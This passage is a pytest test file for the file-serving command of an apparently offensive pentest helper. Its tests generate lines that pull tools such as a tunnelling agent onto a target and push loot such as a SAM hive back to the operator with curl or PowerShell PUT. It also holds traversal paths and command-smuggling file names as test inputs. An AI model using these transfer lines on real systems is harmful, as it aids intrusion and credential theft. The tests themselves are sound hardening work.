import os
import signal
import socket
import sys
import threading
import time
import urllib.error
import urllib.request
from dataclasses import asdict
from pathlib import Path

import pytest

from helpers import NOW, odd_name
from pwn_broker import serving
from pwn_broker.console import FakeConsole
from pwn_broker.serving import Marker, ServeError
from pwn_broker.shell import cmd_serve
from pwn_broker.shell.commands import dispatch
from pwn_broker.store import write_toml
from pwn_broker.vpn import Tunnel

posix_only = pytest.mark.skipif(sys.platform == "win32", reason="a forked server, links and /proc need Linux")
SECRET = "s3cRt9"


def free_port():
    with socket.socket() as s:
        s.bind(("127.0.0.1", 0))
        return s.getsockname()[1]


@pytest.fixture(autouse=True)
def known_secret(monkeypatch):
    # every serve run in these tests gets the same secret, so the expected lines can name it
    monkeypatch.setattr(serving, "new_secret", lambda: SECRET)


def lines(session, kind=None):
    return [t for k, t in session.console.lines if kind is None or k == kind]


@pytest.fixture
def served(tmp_path):
    """A target's upload folder and the tools' upload folder, with a file in each."""
    folder = tmp_path / "box" / "upload"
    tools = tmp_path / "tools-upload"
    (tools / "ligolo-ng").mkdir(parents=True)
    folder.mkdir(parents=True)
    (folder / "shell.ps1").write_text("mine")
    (folder / "sub").mkdir()
    (folder / "sub" / "a b.txt").write_text("nested")
    (folder / ".hidden").write_text("no")
    (tools / "ligolo-ng" / "agent.exe").write_bytes(b"MZagent")
    return folder, tools


# ---- the pieces


def test_url_leaves_out_port_80():
    assert serving.url("10.10.14.5", 80) == "http://10.10.14.5/"
    assert serving.url("10.10.14.5", 8000, "/x") == "http://10.10.14.5:8000/x"


def test_default_port_is_80_for_root_and_8000_otherwise():
    assert serving.default_port(True) == 80
    assert serving.default_port(False) == 8000


KNOWN = {"lo": ["127.0.0.1"], "eth0": ["192.168.1.20"], "tun0": ["10.10.14.5"], "docker0": []}


def test_resolve_takes_the_tunnel_when_nothing_is_given():
    assert serving.resolve(None, "10.10.14.5", {}) == "10.10.14.5"


def test_resolve_refuses_without_a_tunnel_or_an_address():
    with pytest.raises(ServeError, match="^no tunnel is up; name an interface or address"):
        serving.resolve(None, None, KNOWN)


def test_resolve_takes_an_interface_s_address():
    assert serving.resolve("eth0", None, KNOWN) == "192.168.1.20"


def test_resolve_refuses_an_interface_without_ipv4():
    with pytest.raises(ServeError, match="^docker0 has no IPv4 address$"):
        serving.resolve("docker0", None, KNOWN)


def test_resolve_takes_an_address_of_this_machine_and_every_interface_when_asked():
    assert serving.resolve("192.168.1.20", None, KNOWN) == "192.168.1.20"
    assert serving.resolve("0.0.0.0", None, KNOWN) == "0.0.0.0"


def test_resolve_refuses_an_address_this_machine_does_not_have():
    with pytest.raises(ServeError, match="^10.0.0.9 is not an address of this machine$"):
        serving.resolve("10.0.0.9", None, KNOWN)


def test_resolve_names_the_interfaces_for_a_word_it_does_not_know():
    with pytest.raises(ServeError, match=r"^wlan9 is neither an interface nor an IPv4 address \(interfaces: docker0, eth0, lo, tun0\)$"):
        serving.resolve("wlan9", None, KNOWN)


@pytest.mark.parametrize("text", ["0", "65536", "80a", "-1", "８０"])
def test_parse_port_refuses_what_is_not_a_port(text):
    with pytest.raises(ServeError, match=f"^not a port: {text}$"):
        serving.parse_port(text, True)


def test_parse_port_takes_a_port_or_the_default():
    assert serving.parse_port("8080", False) == 8080
    assert serving.parse_port(None, False) == 8000


def test_offered_lists_the_target_s_files_then_each_tool_s(served):
    folder, tools = served
    assert [p for p, _ in serving.offered(folder, tools)] == ["/shell.ps1", "/sub/a b.txt", "/ligolo-ng/agent.exe"]


def test_offered_gives_a_tool_s_folder_name_to_the_tool(served):
    folder, tools = served
    (folder / "ligolo-ng").mkdir()
    (folder / "ligolo-ng" / "mine.txt").write_text("hidden by the tool's folder")
    assert "/ligolo-ng/mine.txt" not in [p for p, _ in serving.offered(folder, tools)]


def test_offered_is_empty_for_folders_that_are_not_there(tmp_path):
    assert serving.offered(tmp_path / "none", tmp_path / "nothing") == []


@pytest.mark.parametrize(
    ("os_name", "expected"),
    [
        ("windows", ["iwr http://a/f.exe -OutFile f.exe"]),
        ("Windows Server", ["iwr http://a/f.exe -OutFile f.exe"]),
        ("linux", ["wget http://a/f.exe"]),
        ("freebsd", ["wget http://a/f.exe"]),
        ("", ["wget http://a/f.exe", "iwr http://a/f.exe -OutFile f.exe"]),
    ],
)
def test_download_lines_follow_the_box_s_os(os_name, expected):
    assert serving.download_lines(os_name, "http://a/f.exe", "f.exe") == expected


@pytest.mark.parametrize(
    "name, shown",
    [
        ("my tool.ps1", "'my tool.ps1'"),
        ("a;calc.ps1", "'a;calc.ps1'"),
        ("it's.ps1", "'it''s.ps1'"),
        ("$(x).ps1", "'$(x).ps1'"),
        # PowerShell takes each of these as a single quote too; doubled, each stays in the string
        ("a\u2019; x.ps1", "'a\u2019\u2019; x.ps1'"),
        ("\u2018a\u201a\u201b.ps1", "'\u2018\u2018a\u201a\u201a\u201b\u201b.ps1'"),
        # a name starting with - would be read as a parameter, and one starting with a digit as a number
        ("-Headers", "'-Headers'"),
        ("0x10", "'0x10'"),
        ("1kb", "'1kb'"),
    ],
)
def test_a_file_name_that_is_not_plain_is_quoted_for_powershell(name, shown):
    # the line is pasted into PowerShell on the target: a space or ; in a name must not end it
    assert serving.download_lines("windows", "http://a/f", name) == [f"iwr http://a/f -OutFile {shown}"]


@pytest.mark.parametrize(
    "name, shown",
    [("a[1].txt", "'a[1].txt'"), ("loot]", "'loot]'"), ("it's [2].txt", "'it''s [2].txt'")],
)
def test_a_name_with_a_square_bracket_is_fetched_without_outfile(name, shown):
    # Windows PowerShell 5.1 takes [ and ] after -OutFile as a wildcard pattern and saves nothing
    assert serving.download_lines("windows", "http://a/s/f", name) == [
        f"(New-Object Net.WebClient).DownloadFile('http://a/s/f', (Join-Path $pwd {shown}))"
    ]


@pytest.mark.parametrize(
    "name, saved",
    [
        ("a:b.txt", "a_b.txt"),
        ('what?*<>|".txt', "what______.txt"),
        ("back\\slash", "back_slash"),
        ("tab\there", "tab_here"),
        # the two bytes of a name that is not UTF-8, as Python holds them
        ("caf\udce9 \udcff.txt", "'caf_ _.txt'"),
        ("a:[1]", None),
    ],
)
def test_what_a_windows_file_name_cannot_hold_is_an_underscore_in_the_saved_name(name, saved):
    [line] = serving.download_lines("windows", "http://a/s/f", name)
    if saved is None:
        assert line == "(New-Object Net.WebClient).DownloadFile('http://a/s/f', (Join-Path $pwd 'a_[1]'))"
    else:
        assert line == f"iwr http://a/s/f -OutFile {saved}"
    # the Linux line names no file, so it is as it was
    assert serving.download_lines("linux", "http://a/s/f", name) == ["wget http://a/s/f"]


def test_a_file_beside_the_tools_folders_is_neither_listed_nor_served(served):
    # /opt/pwn-broker/upload holds a folder for each tool; a file put straight into it is no tool's
    folder, tools = served
    (tools / "stray.txt").write_text("in no tool's folder")
    assert "/stray.txt" not in [p for p, _ in serving.offered(folder, tools)]
    assert serving.find(folder, tools, f"/{SECRET}/stray.txt", SECRET) is None
    # and it does not hide the target's own file of that name
    (folder / "stray.txt").write_text("the target's")
    assert [f for p, f in serving.offered(folder, tools) if p == "/stray.txt"] == [folder / "stray.txt"]
    assert serving.find(folder, tools, f"/{SECRET}/stray.txt", SECRET) == folder / "stray.txt"


def agreed(folder, tools):
    """What is listed, after checking that each file is served at the link its line has."""
    listed = serving.offered(folder, tools)
    for path, found in listed:
        assert serving.find(folder, tools, f"/{SECRET}{serving.link_path(path)}", SECRET) == found, path
    return [path for path, _ in listed]


def test_every_file_listed_is_served_at_its_link(served):
    folder, tools = served
    (folder / "100% [new] & more #1.txt").write_text("x")
    (tools / "stray.txt").write_text("x")
    assert agreed(folder, tools) == ["/100% [new] & more #1.txt", "/shell.ps1", "/sub/a b.txt", "/ligolo-ng/agent.exe"]


@posix_only
def test_a_name_with_a_backslash_or_one_that_is_not_utf8_is_served_at_its_link(served):
    folder, tools = served
    (folder / "back\\slash.txt").write_text("x")
    odd = odd_name(folder)
    assert odd is not None
    assert agreed(folder, tools) == ["/back\\slash.txt", "/caf\udce9 \udcff.txt", "/shell.ps1", "/sub/a b.txt", "/ligolo-ng/agent.exe"]
    assert serving.link_path("/caf\udce9 \udcff.txt") == "/caf%E9%20%FF.txt"


@posix_only
def test_a_link_among_the_tools_folders_is_no_tool_s_folder(served, tmp_path):
    # the listing leaves the link out, so a folder of the target's by that name is listed: serve it
    folder, tools = served
    elsewhere = tmp_path / "elsewhere"
    elsewhere.mkdir()
    (elsewhere / "secret.txt").write_text("secret")
    (tools / "kit").symlink_to(elsewhere, target_is_directory=True)
    (folder / "kit").mkdir()
    (folder / "kit" / "mine.txt").write_text("mine")
    assert "/kit/mine.txt" in agreed(folder, tools)
    assert serving.find(folder, tools, f"/{SECRET}/kit/secret.txt", SECRET) is None


def test_find_serves_the_target_s_files_and_the_tools(served):
    folder, tools = served
    assert serving.find(folder, tools, f"/{SECRET}/shell.ps1", SECRET) == folder / "shell.ps1"
    assert serving.find(folder, tools, f"/{SECRET}/sub/a%20b.txt?x=1", SECRET) == folder / "sub" / "a b.txt"
    assert serving.find(folder, tools, f"/{SECRET}/ligolo-ng/agent.exe", SECRET) == tools / "ligolo-ng" / "agent.exe"


@pytest.mark.parametrize("path", ["/shell.ps1", "/ligolo-ng/agent.exe", "/S3cRt9/shell.ps1", "/s3cRt/shell.ps1", "/s3cRt9x/shell.ps1"])
def test_find_answers_nothing_without_the_run_s_secret(served, path):
    folder, tools = served
    assert serving.find(folder, tools, path, SECRET) is None


def test_new_secret_is_six_letters_and_digits_and_differs_each_run(monkeypatch):
    monkeypatch.undo()
    made = {serving.new_secret() for _ in range(50)}
    assert len(made) == 50
    assert all(len(s) == 6 and s.isascii() and s.isalnum() for s in made)


@pytest.mark.parametrize(
    "path",
    ["/", "/sub", "/.hidden", "/../tools-upload/ligolo-ng/agent.exe", "/%2e%2e/tools-upload/ligolo-ng/agent.exe",
     "/sub/..%2fshell.ps1", "/ligolo-ng", "/missing", "/sub%5c..%5cshell.ps1", "/a%00b"],
)
def test_find_refuses_anything_but_a_plain_file_inside(served, path):
    folder, tools = served
    assert serving.find(folder, tools, f"/{SECRET}{path}", SECRET) is None


@posix_only
def test_find_and_offered_leave_out_links(served, tmp_path):
    folder, tools = served
    outside = tmp_path / "secret.txt"
    outside.write_text("secret")
    (folder / "link.txt").symlink_to(outside)
    (folder / "inner").symlink_to(folder / "sub")
    assert serving.find(folder, tools, f"/{SECRET}/link.txt", SECRET) is None
    assert serving.find(folder, tools, f"/{SECRET}/inner/a%20b.txt", SECRET) is None
    assert "/link.txt" not in [p for p, _ in serving.offered(folder, tools)]


def test_a_name_that_is_a_tool_s_folder_is_the_tool_s_only(tmp_path):
    # as the listing says: under a tool's name only the tool's own files are served
    folder, tools = tmp_path / "upload", tmp_path / "tools"
    (tools / "pspy").mkdir(parents=True)
    (tools / "pspy" / "pspy64").write_bytes(b"tool")
    (folder / "pspy").mkdir(parents=True)
    (folder / "pspy" / "mine.txt").write_text("mine")
    assert "/pspy/mine.txt" not in [p for p, _ in serving.offered(folder, tools)]
    assert serving.find(folder, tools, f"/{SECRET}/pspy/mine.txt", SECRET) is None
    assert serving.find(folder, tools, f"/{SECRET}/pspy/pspy64", SECRET) == tools / "pspy" / "pspy64"


# ---- the marker


def marker_for(session, pid=4321, start="55", box_id=None):
    marker = Marker(pid, start, box_id or session.box.id, session.box.name, "dc01", str(session.box.path),
                    SECRET, "127.0.0.1", 8000, NOW)  # fmt: skip
    path = session.paths.run / "serve" / "marker.toml"
    path.parent.mkdir(parents=True, exist_ok=True)
    write_toml(path, asdict(marker))
    return marker


def running(system, pid=4321, start="55", argv=None):
    system.processes[pid] = (start, "python3")
    system.cmdlines[pid] = argv if argv is not None else ["python3", "-I", "-c", "...", serving.MODULE]


def checks(system):
    return dict(alive=system.pid_alive, started=system.pid_started, cmdline=system.cmdline)


def test_ours_is_the_marker_while_its_process_is_the_server(session, system):
    marker = marker_for(session)
    running(system)
    assert serving.ours(session.paths, **checks(system)) == marker


def test_ours_forgets_the_marker_of_a_process_that_ended(session, system):
    marker_for(session)
    assert serving.ours(session.paths, **checks(system)) is None
    assert not (session.paths.run / "serve" / "marker.toml").exists()


@pytest.mark.parametrize(("start", "argv"), [("99", None), ("55", ["python3", "-m", "http.server"])])
def test_ours_never_takes_a_reused_process_id(session, system, start, argv):
    marker_for(session)
    running(system, start=start, argv=argv)
    assert serving.ours(session.paths, **checks(system)) is None


def test_stop_signals_the_server_and_forgets_it(session, system):
    marker_for(session)
    running(system)
    serving.stop(session.paths, kill=system.kill, sleep=system.sleep, **checks(system))
    assert system.killed == [(4321, signal.SIGTERM)]
    assert not (session.paths.run / "serve" / "marker.toml").exists()


def test_stop_refuses_when_nothing_is_served(session, system):
    with pytest.raises(ServeError, match="^nothing is being served$"):
        serving.stop(session.paths, kill=system.kill, sleep=system.sleep, **checks(system))
    assert system.killed == []


# ---- the commands


@pytest.fixture
def tunnel(system):
    system.tunnel_found = Tunnel("tun0", "127.0.0.1")
    return system


def test_serve_needs_a_target(session):
    session.current = None
    dispatch(session, "serve")
    assert lines(session, "fail") == ["no target is selected; target use <target> first"]


def test_serve_without_a_tunnel_asks_for_an_address(session, system):
    dispatch(session, "serve")
    assert lines(session, "fail") == [serving.NO_TUNNEL]
    assert system.spawned == []


def test_serve_starts_on_the_tunnel_and_says_how_many_files_without_listing_them(session, tunnel):
    port = free_port()
    upload = session.paths.upload / "ligolo-ng"
    upload.mkdir(parents=True)
    (upload / "agent.exe").write_bytes(b"MZ")
    (upload / "agent").write_bytes(b"ELF")
    dispatch(session, f"serve tun0 {port}")
    folder = session.box.path / "targets" / "dc01" / "upload"
    assert folder.is_dir()
    [argv] = tunnel.spawned
    assert serving.MODULE in argv and str(folder) in argv and str(session.paths.upload) in argv
    assert lines(session, "fail") == []
    assert lines(session, "ok") == [f"serving dc01's upload folder and the tools' files on http://127.0.0.1:{port}/{SECRET}/"]
    assert lines(session, "detail") == []
    assert lines(session, "info") == [
        "2 files; serve files shows the lines to fetch them and to send files back",
        "serve log shows who fetched what; serve stop ends it",
    ]


def test_serve_files_shows_the_download_lines(session, tunnel):
    port = free_port()
    upload = session.paths.upload / "ligolo-ng"
    upload.mkdir(parents=True)
    (upload / "agent.exe").write_bytes(b"MZ")
    dispatch(session, f"serve tun0 {port}")
    (session.box.path / "targets" / "dc01" / "upload" / "run.ps1").write_text("hi")
    session.console = FakeConsole()
    dispatch(session, "serve files")
    # the box is a Windows one; a file put in after the start is listed too
    assert session.console.lines == [
        ("detail", f"iwr http://127.0.0.1:{port}/{SECRET}/run.ps1 -OutFile run.ps1"),
        ("detail", f"iwr http://127.0.0.1:{port}/{SECRET}/ligolo-ng/agent.exe -OutFile agent.exe"),
        ("info", "to send a file back into targets/dc01/loot:"),
        ("detail", f"iwr -UseBasicParsing -Method PUT -InFile <file> http://127.0.0.1:{port}/{SECRET}/<file>"),
    ]


def test_serve_files_with_a_word_shows_only_the_files_it_matches(session, tunnel):
    port = free_port()
    upload = session.paths.upload / "ligolo-ng"
    upload.mkdir(parents=True)
    (upload / "agent.exe").write_bytes(b"MZ")
    dispatch(session, f"serve tun0 {port}")
    (session.box.path / "targets" / "dc01" / "upload" / "run.ps1").write_text("hi")
    session.console = FakeConsole()
    dispatch(session, "serve files AGENT")
    assert lines(session, "detail") == [f"iwr http://127.0.0.1:{port}/{SECRET}/ligolo-ng/agent.exe -OutFile agent.exe"]
    session.console = FakeConsole()
    dispatch(session, "serve files mimikatz")
    assert lines(session) == ["no file served matches mimikatz"]


def test_serve_files_with_nothing_served(session):
    dispatch(session, "serve files")
    assert lines(session, "fail") == ["nothing is being served; start it with serve"]


def test_serve_with_no_files_says_where_to_put_them(session, tunnel):
    tunnel.interfaces_found = {"lo": ["127.0.0.1"]}
    dispatch(session, f"serve 127.0.0.1 {free_port()}")
    assert "nothing to offer yet: put files in targets/dc01/upload" in lines(session, "info")


def test_serve_takes_the_tunnel_when_nothing_is_given(session, tunnel, monkeypatch):
    port = free_port()
    monkeypatch.setattr(serving, "default_port", lambda root: port)
    dispatch(session, "serve")
    assert lines(session, "ok") == [f"serving dc01's upload folder and the tools' files on http://127.0.0.1:{port}/{SECRET}/"]


def test_serve_again_shows_what_runs_and_refuses_new_arguments(session, tunnel):
    port = free_port()
    dispatch(session, f"serve tun0 {port}")
    session.console = FakeConsole()
    dispatch(session, "serve")
    since = f"{session.clock():%Y-%m-%d %H:%M}"
    assert lines(session, "ok") == [
        f"serving dc01's upload folder and the tools' files on http://127.0.0.1:{port}/{SECRET}/, for forest, since {since}"
    ]
    session.console = FakeConsole()
    dispatch(session, "serve eth0")
    assert lines(session, "fail") == [f"already serving on http://127.0.0.1:{port}/; serve stop first"]
    assert len(tunnel.spawned) == 1


def test_serve_says_when_the_port_is_taken(session, tunnel):
    with socket.socket() as busy:
        busy.bind(("127.0.0.1", 0))
        busy.listen()
        port = busy.getsockname()[1]
        dispatch(session, f"serve tun0 {port}")
    [failed] = lines(session, "fail")
    assert failed.startswith(f"cannot listen on 127.0.0.1 port {port}: ")
    assert tunnel.spawned == []


def test_serve_stop_stops_it(session, tunnel):
    port = free_port()
    dispatch(session, f"serve tun0 {port}")
    pid = 40001
    session.console = FakeConsole()
    dispatch(session, "serve stop")
    assert tunnel.killed == [(pid, signal.SIGTERM)]
    assert lines(session, "ok") == [f"stopped serving on http://127.0.0.1:{port}/"]


def test_serve_stop_with_nothing_served(session):
    dispatch(session, "serve stop")
    assert lines(session, "fail") == ["nothing is being served"]


def test_serve_log_before_anything_was_served(session):
    dispatch(session, "serve log")
    assert lines(session, "info") == ["the server has written nothing yet"]


def test_serve_log_shows_the_last_lines(session):
    log = session.paths.run / "serve" / "serve.log"
    log.parent.mkdir(parents=True)
    log.write_text("".join(f"line {n}\n" for n in range(30)))
    dispatch(session, "serve log")
    assert lines(session, "log") == [f"line {n}" for n in range(10, 30)]


class Counted:
    """A file that notes how many bytes are read from it."""

    def __init__(self, fh, taken):
        self.fh, self.taken = fh, taken

    def __enter__(self):
        return self

    def __exit__(self, *exc):
        self.fh.close()

    def seek(self, *args):
        return self.fh.seek(*args)

    def read(self, size=-1):
        data = self.fh.read(size)
        self.taken.append(len(data))
        return data


@pytest.mark.parametrize("ending", [b"\n", b""])
def test_serve_log_reads_only_the_end_of_a_large_log(session, monkeypatch, ending):
    log = session.paths.run / "serve" / "serve.log"
    log.parent.mkdir(parents=True)
    log.write_bytes(b"\n".join(b"line %d" % n for n in range(40000)) + ending)
    taken = []
    monkeypatch.setattr(serving, "open", lambda *args, **kwargs: Counted(open(*args, **kwargs), taken), raising=False)
    assert serving.log_tail(session.paths) == [f"line {n}" for n in range(39980, 40000)]
    # some 400 KiB of log, and a block or two of it read
    assert 0 < sum(taken) <= 2 * serving.TAIL_BLOCK
    assert serving.log_tail(session.paths, 50000) == [f"line {n}" for n in range(40000)]
    assert serving.log_tail(session.paths, 0) == []


def test_a_line_longer_than_a_block_is_still_read_whole(session):
    log = session.paths.run / "serve" / "serve.log"
    log.parent.mkdir(parents=True)
    long = "x" * (3 * serving.TAIL_BLOCK)
    log.write_bytes(f"first\n{long}\nlast\n".encode())
    assert serving.log_tail(session.paths, 2) == [long, "last"]


@pytest.fixture
def small_log(monkeypatch):
    monkeypatch.setattr(serving, "LOG_MAX", 2000)
    monkeypatch.setattr(serving, "LOG_KEEP", 1000)


def test_the_log_keeps_its_last_part_once_it_is_large(tmp_path, small_log):
    log_file = tmp_path / "serve.log"
    log = serving._logger(log_file)
    for n in range(500):
        log(f"line {n:04}")
        assert log_file.stat().st_size <= 2000 + len("line 0000\r\n")
    rows = log_file.read_text().splitlines()
    # whole lines only, in order, up to the last one written
    assert 50 <= len(rows) and rows == [f"line {n:04}" for n in range(500 - len(rows), 500)]


def test_serve_cuts_a_log_an_earlier_run_left_large(session, tunnel, small_log):
    log = session.paths.run / "serve" / "serve.log"
    log.parent.mkdir(parents=True)
    log.write_bytes(b"".join(b"line %04d\n" % n for n in range(500)))
    port = free_port()
    dispatch(session, f"serve tun0 {port}")
    rows = log.read_text().splitlines()
    assert log.stat().st_size <= 1200
    assert rows[0].startswith("line 04") and rows[-3] == "line 0499"
    assert rows[-2].endswith(f"serving http://127.0.0.1:{port}/ for forest/dc01")
    assert rows[-1].endswith("listening, process 40001")


def test_a_log_that_is_not_there_or_is_small_is_left_alone(tmp_path, small_log):
    serving.trim_log(tmp_path / "none.log")
    small = tmp_path / "small.log"
    small.write_bytes(b"one\ntwo\n")
    serving.trim_log(small)
    assert small.read_bytes() == b"one\ntwo\n" and not (tmp_path / "none.log").exists()


def test_serve_files_gives_a_line_for_a_name_that_is_not_utf8(session, tunnel):
    port = free_port()
    dispatch(session, f"serve tun0 {port}")
    if odd_name(session.box.path / "targets" / "dc01" / "upload") is None:
        pytest.skip("no file can have such a name here")
    for os_name, line in (
        ("windows", f"iwr http://127.0.0.1:{port}/{SECRET}/caf%E9%20%FF.txt -OutFile 'caf_ _.txt'"),
        ("linux", f"wget http://127.0.0.1:{port}/{SECRET}/caf%E9%20%FF.txt"),
    ):
        session.box.os = os_name
        session.console = FakeConsole()
        dispatch(session, "serve files")
        assert lines(session, "fail") == []
        assert lines(session, "detail")[0] == line
    session.console = FakeConsole()
    dispatch(session, "serve files CAF")
    assert len(lines(session, "detail")) == 1


def test_every_interface_is_said_out_loud(session, tunnel):
    tunnel.interfaces_found = {"lo": ["127.0.0.1"]}
    dispatch(session, f"serve 0.0.0.0 {free_port()}")
    assert lines(session, "warn") == ["listening on every interface, not only the tunnel"]


# ---- finish


def test_finish_lists_and_stops_the_box_s_server(session, system):
    marker_for(session)
    running(system)
    assert cmd_serve.summary(session) == [("serving", "http://127.0.0.1:8000/   (will be stopped)")]
    cmd_serve.undo(session)
    assert system.killed == [(4321, signal.SIGTERM)]
    assert lines(session, "ok") == ["stopped serving on http://127.0.0.1:8000/"]


def test_finish_leaves_another_box_s_server_alone(session, system):
    marker_for(session, box_id="another-box")
    running(system)
    assert cmd_serve.summary(session) == []
    cmd_serve.undo(session)
    assert system.killed == [] and lines(session) == []


def test_finish_warns_when_the_server_does_not_stop(session, system):
    marker_for(session)
    running(system)
    session.kill = lambda pid, sig: None  # the process ignores the signal
    cmd_serve.undo(session)
    assert lines(session, "warn") == [
        "the file server could not be stopped: the server (process 4321) did not stop; run serve stop"
    ]


# ---- the real server


def fetch(address, port, path):
    try:
        with urllib.request.urlopen(f"http://{address}:{port}{path}", timeout=5) as answer:
            return answer.status, answer.read()
    except urllib.error.HTTPError as exc:
        with exc:
            return exc.code, exc.read()


@posix_only
def test_the_real_server_serves_both_folders_logs_and_stops(session, served, monkeypatch):
    folder, tools = served
    monkeypatch.setattr(serving, "target_folder", lambda box, target: folder)
    session.paths.upload.parent.mkdir(parents=True, exist_ok=True)
    os.symlink(tools, session.paths.upload)
    port = free_port()
    marker = serving.start(session.paths, session.box, session.current, "127.0.0.1", port, clock=lambda: NOW)
    s = f"/{marker.secret}"
    try:
        assert fetch("127.0.0.1", port, f"{s}/shell.ps1") == (200, b"mine")
        assert fetch("127.0.0.1", port, f"{s}/sub/a%20b.txt") == (200, b"nested")
        assert fetch("127.0.0.1", port, f"{s}/ligolo-ng/agent.exe") == (200, b"MZagent")
        assert fetch("127.0.0.1", port, f"{s}/../../etc/passwd")[0] == 404
        assert fetch("127.0.0.1", port, f"{s}/.hidden")[0] == 404
        # without the secret nothing is answered, a known tool's path included
        assert fetch("127.0.0.1", port, "/ligolo-ng/agent.exe") == (404, b"not found\n")
        assert fetch("127.0.0.1", port, "/shell.ps1") == (404, b"not found\n")
        # a file dropped in after the start is served
        (folder / "late.txt").write_text("late")
        assert fetch("127.0.0.1", port, f"{s}/late.txt") == (200, b"late")
        # nothing lists what is offered: not the top, not the secret's own folder, not a folder
        for path in ("/", f"{s}", f"{s}/", f"{s}/sub/", f"{s}/sub", f"{s}/ligolo-ng/", "/?C=M;O=D"):
            assert fetch("127.0.0.1", port, path) == (404, b"not found\n"), path
        assert serving.ours(session.paths) == marker
    finally:
        serving.stop(session.paths)
    assert serving.ours(session.paths) is None
    log = serving.log_tail(session.paths, 50)
    assert log[0].endswith(f"serving http://127.0.0.1:{port}/ for forest/dc01")
    assert any(f"127.0.0.1  GET {s}/ligolo-ng/agent.exe HTTP/1.1  200" in line for line in log)
    assert any("GET /ligolo-ng/agent.exe HTTP/1.1  404" in line for line in log)
    with pytest.raises(OSError):
        with socket.create_connection(("127.0.0.1", port), timeout=1):
            pass


@posix_only
def test_the_real_server_outlives_the_prompt_that_started_it(session, served, monkeypatch, tmp_path):
    folder, tools = served
    monkeypatch.setattr(serving, "target_folder", lambda box, target: folder)
    port = free_port()
    marker = serving.start(session.paths, session.box, session.current, "127.0.0.1", port, clock=lambda: NOW)
    try:
        # its own session: a Ctrl-C or a closed window in the prompt does not reach it
        assert os.getsid(marker.pid) == marker.pid
        assert fetch("127.0.0.1", port, f"/{marker.secret}/shell.ps1") == (200, b"mine")
    finally:
        serving.stop(session.paths)
    time.sleep(0.1)


# ---- receiving


@pytest.mark.parametrize("name", ["loot.zip", "SAM backup.hive", "x.tar.gz"])
def test_received_name_takes_one_plain_name_under_the_secret(name):
    assert serving.received_name(f"/{SECRET}/{name.replace(' ', '%20')}", SECRET) == name


@pytest.mark.parametrize(
    "path",
    [f"/{SECRET}/", f"/{SECRET}", "/loot.zip", f"/wrong/loot.zip", f"/{SECRET}/a/b.zip", f"/{SECRET}/.bashrc",
     f"/{SECRET}/..", f"/{SECRET}/%2e%2e", f"/{SECRET}/a%5cb", f"/{SECRET}/a%0ab", f"/{SECRET}/a%00b",
     f"/{SECRET}/" + "x" * 201],
)
def test_received_name_refuses_anything_else(path):
    assert serving.received_name(path, SECRET) is None


def test_receive_into_writes_the_file_and_never_over_another(tmp_path):
    import io

    loot = tmp_path / "loot"
    first = serving.receive_into(loot, "sam.hive", 5, io.BytesIO(b"first and more"))
    second = serving.receive_into(loot, "sam.hive", 6, io.BytesIO(b"second"))
    assert (first.name, first.read_bytes()) == ("sam.hive", b"first")
    assert (second.name, second.read_bytes()) == ("sam-2.hive", b"second")
    assert sorted(p.name for p in loot.iterdir()) == ["sam-2.hive", "sam.hive"]


def test_a_transfer_cut_short_leaves_nothing(tmp_path):
    import io

    loot = tmp_path / "loot"
    with pytest.raises(OSError, match="cut short"):
        serving.receive_into(loot, "big.bin", 100, io.BytesIO(b"only this"))
    assert list(loot.iterdir()) == []


def test_receive_refuses_what_would_fill_the_disk(tmp_path, monkeypatch):
    import io
    from collections import namedtuple

    usage = namedtuple("usage", "total used free")
    monkeypatch.setattr(serving.shutil, "disk_usage", lambda path: usage(0, 0, serving.ROOM_LEFT + 10))
    with pytest.raises(serving.NoRoom):
        serving.receive_into(tmp_path / "loot", "x.bin", 11, io.BytesIO(b"x" * 11))
    assert serving.receive_into(tmp_path / "loot", "x.bin", 10, io.BytesIO(b"x" * 10)).read_bytes() == b"x" * 10


def test_uploads_at_the_same_time_share_the_room_left(tmp_path, monkeypatch):
    # serve takes each upload in a thread of its own: each one counts what the others still have to
    # write, or together they would fill the disk past the room it keeps
    import io
    from collections import namedtuple

    usage = namedtuple("usage", "total used free")
    monkeypatch.setattr(serving.shutil, "disk_usage", lambda path: usage(0, 0, serving.ROOM_LEFT + 150))
    loot = tmp_path / "loot"
    seen = []

    class Slow(io.BytesIO):
        # the second upload arrives while the first is still being written
        def read(self, size=-1):
            if not seen:
                with pytest.raises(serving.NoRoom) as refused:
                    serving.receive_into(loot, "two.bin", 100, io.BytesIO(b"y" * 100))
                seen.append(refused.value)
            return super().read(size)

    assert serving.receive_into(loot, "one.bin", 100, Slow(b"x" * 100)).read_bytes() == b"x" * 100
    assert len(seen) == 1
    # and once the first is done, what it held back is free again
    assert serving.receive_into(loot, "three.bin", 100, io.BytesIO(b"z" * 100)).exists()


@pytest.mark.parametrize(
    ("os_name", "expected"),
    [
        ("windows", ["iwr -UseBasicParsing -Method PUT -InFile <file> http://a/s/<file>"]),
        ("linux", ["curl -T <file> http://a/s/"]),
        ("", ["curl -T <file> http://a/s/", "iwr -UseBasicParsing -Method PUT -InFile <file> http://a/s/<file>"]),
    ],
)
def test_upload_lines_follow_the_box_s_os(os_name, expected):
    assert serving.upload_lines(os_name, "http://a/s/") == expected


def put(address, port, path, data, headers=None):
    request = urllib.request.Request(f"http://{address}:{port}{path}", data=data, method="PUT", headers=headers or {})
    try:
        with urllib.request.urlopen(request, timeout=5) as answer:
            return answer.status, answer.read()
    except urllib.error.HTTPError as exc:
        with exc:
            return exc.code, exc.read()


@posix_only
def test_the_real_server_takes_files_back_into_loot(session, served, monkeypatch):
    folder, tools = served
    monkeypatch.setattr(serving, "target_folder", lambda box, target: folder)
    port = free_port()
    marker = serving.start(session.paths, session.box, session.current, "127.0.0.1", port, clock=lambda: NOW)
    s = f"/{marker.secret}"
    loot = folder.parent / "loot"
    try:
        assert put("127.0.0.1", port, f"{s}/sam.hive", b"hive") == (201, b"saved sam.hive\n")
        assert put("127.0.0.1", port, f"{s}/sam.hive", b"again") == (201, b"saved sam-2.hive\n")
        assert (loot / "sam.hive").read_bytes() == b"hive" and (loot / "sam-2.hive").read_bytes() == b"again"
        # without the secret, into a folder, or as a dot name, nothing is taken
        assert put("127.0.0.1", port, "/sam.hive", b"x")[0] == 404
        assert put("127.0.0.1", port, f"{s}/sub/x.txt", b"x")[0] == 404
        assert put("127.0.0.1", port, f"{s}/.profile", b"x")[0] == 404
        assert put("127.0.0.1", port, f"{s}/..%2fbox.toml", b"x")[0] == 404
        assert sorted(p.name for p in loot.iterdir()) == ["sam-2.hive", "sam.hive"]
        # what was taken in is not served back: loot is not one of the folders offered
        assert fetch("127.0.0.1", port, f"{s}/sam.hive")[0] == 404
    finally:
